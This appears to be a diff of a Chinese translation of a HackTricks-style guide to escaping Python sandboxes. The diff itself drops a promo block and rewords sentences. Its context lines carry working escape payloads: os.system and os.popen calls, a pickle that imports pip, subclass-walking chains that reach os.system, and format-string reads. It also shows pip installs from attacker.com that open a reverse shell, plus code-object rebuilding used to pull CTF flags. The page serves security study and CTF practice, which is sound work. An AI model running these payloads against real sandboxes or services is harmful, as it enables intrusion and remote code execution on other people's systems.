@@ -15,19 +15,11 @@
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 这些是一些绕过 Python 沙箱保护并执行任意命令的技巧。
 
 ## 命令执行库
 
-你需要知道的第一件事是，你是否可以直接使用某个已导入的库执行代码，或者你是否可以导入这些库中的任何一个：
+你需要知道的第一件事是，你是否可以直接使用某个已导入的库执行代码，或者你是否可以导入以下任何库：
 ```python
 os.system("ls")
 os.popen("ls").read()
@@ -76,7 +68,7 @@ Python 尝试 **首先从当前目录加载库**（以下命令将打印 python 
 
 你可以在这里找到 **预安装包的列表**: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 请注意，从一个 pickle 中你可以使 python 环境 **导入系统中安装的任意库**。\
-例如，以下 pickle，在加载时，将导入 pip 库以使用它：
+例如，以下 pickle 在加载时将导入 pip 库以使用它：
 ```python
 #Note that here we are importing the pip library so the pickle is created correctly
 #however, the victim doesn't even need to have the library installed to execute it
@@ -89,26 +81,26 @@ return (pip.main,(["list"],))
 
 print(base64.b64encode(pickle.dumps(P(), protocol=0)))
 ```
-有关 pickle 工作原理的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
+有关pickle如何工作的更多信息，请查看此链接: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)
 
-### Pip 包
+### Pip包
 
-技巧由 **@isHaacK** 分享
+由**@isHaacK**分享的技巧
 
-如果您可以访问 `pip` 或 `pip.main()`，您可以安装任意包并通过以下方式获得反向 shell:
+如果您可以访问`pip`或`pip.main()`，您可以安装任意包并通过调用获得反向shell:
 ```bash
 pip install http://attacker.com/Rerverse.tar.gz
 pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
-您可以在此处下载创建反向 shell 的包。请注意，在使用之前，您应该**解压缩它，修改 `setup.py`，并输入您的反向 shell 的 IP**：
+您可以在此处下载创建反向 shell 的包。请注意，在使用之前，您应该**解压缩它，修改 `setup.py`，并将您的 IP 放入反向 shell 中**：
 
 {% file src="../../../.gitbook/assets/Reverse.tar (1).gz" %}
 
 {% hint style="info" %}
-这个包被称为 `Reverse`。然而，它是特别制作的，以便当您退出反向 shell 时，其余的安装将失败，因此您**在离开时不会在服务器上留下任何额外的 python 包**。
+这个包叫做 `Reverse`。然而，它是特别制作的，以便当您退出反向 shell 时，其余的安装将失败，因此您**在离开时不会在服务器上留下任何额外的 python 包**。
 {% endhint %}
 
-## 评估 python 代码
+## Eval-ing python code
 
 {% hint style="warning" %}
 请注意，exec 允许多行字符串和“;”，但 eval 不允许（检查海象运算符）
@@ -338,7 +330,7 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ### No Builtins
 
 当你没有 `__builtins__` 时，你将无法导入任何内容，甚至无法读取或写入文件，因为 **所有的全局函数**（如 `open`、`import`、`print`...）**都没有加载**。\
-然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看起来可能是无害的，但其中一些 **也在内部导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
+然而，**默认情况下，python 会在内存中导入很多模块**。这些模块看似无害，但其中一些 **也导入了危险** 的功能，可以被访问以获得 **任意代码执行**。
 
 在以下示例中，你可以观察到如何 **滥用** 一些被加载的 "**无害**" 模块，以 **访问** **危险** **功能**。 
 
@@ -428,11 +420,11 @@ class_obj.__init__.__globals__
 
 ## 发现任意执行
 
-在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方法。
+在这里，我想解释如何轻松发现 **更危险的功能** 并提出更可靠的利用方式。
 
 #### 通过绕过访问子类
 
-此技术的一个最敏感部分是能够 **访问基类子类**。在之前的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 完成的，但还有 **其他可能的方法**：
+此技术最敏感的部分之一是能够 **访问基类子类**。在之前的示例中，这是通过 `''.__class__.__base__.__subclasses__()` 完成的，但还有 **其他可能的方法**：
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -471,7 +463,7 @@ defined_func.__class__.__base__.__subclasses__()
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
-我们可以对**其他库**做同样的事情，这些库我们知道可以用来**执行命令**：
+我们可以对我们知道可以用来**执行命令**的**其他库**做同样的事情：
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -686,10 +678,10 @@ main()
 
 ## Python 格式字符串
 
-如果您**发送**一个将要被**格式化**的**字符串**给python，您可以使用`{}`来访问**python内部信息。**您可以使用之前的示例来访问全局变量或内置函数，例如。
+如果您**发送**一个**字符串**给 python，该字符串将被**格式化**，您可以使用 `{}` 来访问**python 内部信息。** 您可以使用之前的示例来访问全局变量或内置函数，例如。
 
 {% hint style="info" %}
-然而，有一个**限制**，您只能使用符号`.[]`，因此您**无法执行任意代码**，只能读取信息。\
+然而，有一个**限制**，您只能使用符号 `.[]`，因此您**无法执行任意代码**，只能读取信息。\
 _**如果您知道如何通过此漏洞执行代码，请与我联系。**_
 {% endhint %}
 ```python
@@ -881,7 +873,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-注意，如果您无法在 Python 沙箱中导入 `dis`，您可以获取函数的 **字节码** (`get_flag.func_code.co_code`) 并在本地 **反汇编**。您将看不到正在加载的变量的内容 (`LOAD_CONST`)，但您可以从 (`get_flag.func_code.co_consts`) 猜测它们，因为 `LOAD_CONST` 还告诉您正在加载的变量的偏移量。
+注意，**如果你无法在python沙箱中导入`dis`**，你可以获取函数的**字节码**（`get_flag.func_code.co_code`）并在本地**反汇编**它。你不会看到正在加载的变量的内容（`LOAD_CONST`），但你可以从（`get_flag.func_code.co_consts`）中推测它们，因为`LOAD_CONST`也会告诉正在加载的变量的偏移量。
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -906,7 +898,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 ## 编译 Python
 
 现在，让我们想象一下，您可以以某种方式**转储您无法执行的函数的信息**，但您**需要**去**执行**它。\
-就像在以下示例中，您**可以访问该函数的代码对象**，但仅仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
+就像在以下示例中，您**可以访问该函数的代码对象**，但仅通过读取反汇编，您**不知道如何计算标志**（_想象一个更复杂的 `calc_flag` 函数_）
 ```python
 def get_flag(some_input):
 var1=1
@@ -952,7 +944,7 @@ types.CodeType.__doc__
 ### 重建泄露的函数
 
 {% hint style="warning" %}
-在以下示例中，我们将直接从函数代码对象获取重建函数所需的所有数据。在一个**真实的例子**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**内容。
+在以下示例中，我们将直接从函数代码对象获取重建函数所需的所有数据。在一个**真实示例**中，执行函数**`code_type`**所需的所有**值**就是**你需要泄露的**内容。
 {% endhint %}
 ```python
 fc = get_flag.__code__
@@ -966,7 +958,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-在本文开头的前几个示例中，您可以看到**如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以**在一行中执行整个脚本**，包括循环等（我们也可以使用**`exec`**做到这一点）。\
+在本文开头的前几个示例中，您可以看到**如何使用 `compile` 函数执行任何 python 代码**。这很有趣，因为您可以**在一行中执行整个脚本**，包括循环和所有内容（我们也可以使用 **`exec`** 做同样的事情）。\
 无论如何，有时在本地机器上**创建**一个**编译对象**并在**CTF 机器**上执行它可能是有用的（例如，因为我们在 CTF 中没有 `compiled` 函数）。
 
 例如，让我们手动编译并执行一个读取 _./poc.py_ 的函数：
@@ -1039,23 +1031,18 @@ print(f"\nNot a Super User!!!\n")
 * [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html)
 * [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
 
-**努力安全小组**
-
-<figure><img src="../../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
-学习和实践 AWS 黑客攻击：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习和实践 GCP 黑客攻击：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
